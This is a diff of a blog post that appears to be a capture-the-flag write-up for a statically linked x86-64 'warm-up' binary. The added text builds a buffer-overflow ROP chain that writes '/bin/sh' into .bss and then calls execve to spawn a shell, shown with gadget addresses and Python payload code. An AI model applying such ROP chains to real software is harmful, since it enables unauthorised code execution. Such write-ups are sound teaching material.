@@ -6,36 +6,104 @@ tags: ["PWN", "ROP", "CTF"]
 excerpt: "Solving the warm-up challenge from THEM CTF 2026 using ROP technique to spawn a shell."
 ---
 
-# Warm-up (THEM-CTF-2026) 
+# Warm-up (THEM-CTF-2026)
 
-## Challenge Overview  
-- We use checksec to overview the binary 
-- ![checksec](/images/them-ctf-2026/warm-up/check-sec.png)<br>
--> we see that `NO PIE`, so address of any function or command in assembly is fixed; And it's the reason we use ROP technique<br>
-- Our goal: Executing `system("/bin/sh")` to spawn shell 
+## Challenge Overview
 
-## Static Analysis 
-- We try to put some different inputs, and we see that we can put a very long input into the buffer -> it's the vulnerability 
-- ![test-input](/images/them-ctf-2026/warm-up/test-input.png)
-- Next, we will use IDA to analyze the diassembly of this binary
-- ![ida-main](/images/them-ctf-2026/warm-up/ida-main.png) : 
-    - We note that some function like `puts` named as `IO_puts`, we should check again this binary 
-    - > warm_up: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=763c6a95796cda2157403a14c7c0aaaa80da3d75, for GNU/Linux 3.2.0, not stripped
-    - It means that all function are inside the binary, and we have their addresses 
-- Inside `main`, there's `vuln` function called 
-- ![ida-main](/images/them-ctf-2026/warm-up/ida-main.png) : 
-    - `__libc_read` is called with limit is `0x120` bytes -> The input we can put is very long 
-- ![ida-main](/images/them-ctf-2026/warm-up/ida-main.png) :
-    - See that decompiled C-code, there are some conditions of our input, note this 
+- We use `checksec` to check the binary's security.
 
-## Process Of Spawning Shell 
-- First, we want to know how the ROP works, you can go to [Return-Oriented Programming – Ret2Win (ROP Emporium)](https://chihuyenichi.github.io/huyenchi-blog/post/return-oriented-programming) to understand this technique 
-- We need to file all address of `pop rdi; ret`, string `/bin/sh`, `syscall, ret`, `system, ret`; We will use ROPgadget Tool `ROPgadget --binary warm-up > gadgets.txt`
--  
-    ```py
-    syscall_ret  = p64(0x44ebd9)        # syscall; ret
-    pop_rdi      = p64(0x401f9f)        # pop rdi; ret
-    ```
+![checksec](/images/them-ctf-2026/warm-up/check-sec.png)
+
+The binary has **NO PIE**, so all addresses inside it are fixed. This is why we can use ROP.
+
+- Our goal: call `system("/bin/sh")` to get a shell.
+
+## Static Analysis
+
+- We try different inputs and find that we can enter a very long input into the buffer. This is a buffer overflow vulnerability.
+
+![test-input](/images/them-ctf-2026/warm-up/test-input.png)
+
+- Next, we use IDA to analyze the binary's disassembly.
+
+![ida-main](/images/them-ctf-2026/warm-up/ida-main.png)
+
+  - Some functions like `puts` are named `IO_puts`. We should check the binary type:
+  - > warm_up: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), **statically linked**, not stripped
+  - This means all functions are inside the binary, and we have direct access to their addresses.
+
+- Inside `main`, there is a function called `vuln`.
+
+![vuln_func](/images/them-ctf-2026/warm-up/vuln_func.png)
+
+  - `__libc_read` is called with a limit of `0x120` bytes. This means we can send a long input.
+
+- Looking at the decompiled C code, there are some conditions on our input. We need to keep this in mind.
+
+## Process of Spawning a Shell
+
+- If you are new to ROP, read [this post](https://chihuyenichi.github.io/huyenchi-blog/post/return-oriented-programming) first.
+
+- We need to find gadgets: `pop rdi; ret`, `syscall; ret`, and the string `/bin/sh`. Use ROPgadget:
+
+```
+ROPgadget --binary warm-up > gadgets.txt
+```
+
+From the output, we get:
+
+```py
+syscall_ret  = p64(0x44ebd9)        # syscall; ret
+pop_rdi      = p64(0x401f9f)        # pop rdi; ret
+```
+
+- But we **cannot find** the string `/bin/sh` in the binary. So we need to write it ourselves into the `.bss` section (a memory area for uninitialized global variables).
+
+### Writing `/bin/sh` into `.bss`
+
+To write into `.bss`, we need:
+
+- The address of `.bss` — where we will store `/bin/sh`
+- `pop rax`, `pop rdi`, `pop rsi`, `pop rdx` — to set arguments for the `read` syscall
+- `syscall; ret` — to execute the syscall
+
+**Important**: our payload must be shorter than `0x120` bytes.
+
+From the gadgets file, we find:
+
+```py
+syscall_ret  = p64(0x44ebd9)        # syscall; ret
+xor_eax_ret  = p64(0x40240e)        # xor eax, eax; ret
+pop_rax      = p64(0x44ffc7)        # pop rax; ret
+pop_rdi      = p64(0x401f9f)        # pop rdi; ret
+pop_rsi      = p64(0x40a00e)        # pop rsi; ret
+pop_rdx_rbx  = p64(0x485d2b)        # pop rdx; pop rbx; ret
+bss_addr     = p64(0x4c72b0)
+
+payload  = b"A" * (0x80 + 0x8)
+
+# read(0, bss, 8)
+payload += xor_eax_ret              # rax = 0  (SYS_read)
+payload += pop_rdi + p64(0)         # rdi = 0  (stdin)
+payload += pop_rsi + bss_addr       # rsi = bss address
+payload += pop_rdx_rbx + p64(8) + p64(0)  # rdx = 8 (read 8 bytes)
+payload += syscall_ret
+```
+
+After sending this payload, the program waits for more input. We send `/bin/sh`.
+
+### Finishing the ROP Chain
+
+Now we execute `execve("/bin/sh", 0, 0)`:
+
+```py
+# execve(bss, 0, 0)
+payload += pop_rax + p64(59)        # rax = 59 (SYS_execve)
+payload += pop_rdi + bss_addr       # rdi = address of "/bin/sh"
+payload += pop_rsi + p64(0)         # rsi = 0  (argv = NULL)
+payload += pop_rdx_rbx + p64(0) + p64(0)  # rdx = 0  (envp = NULL)
+payload += syscall_ret
+```
 - I can't find the string `/bin/sh`; So we should think about initializing this string in `.bss` (Block Started by Symbol)
     - We can understand `.bss` section as where save statically allocated variables
 
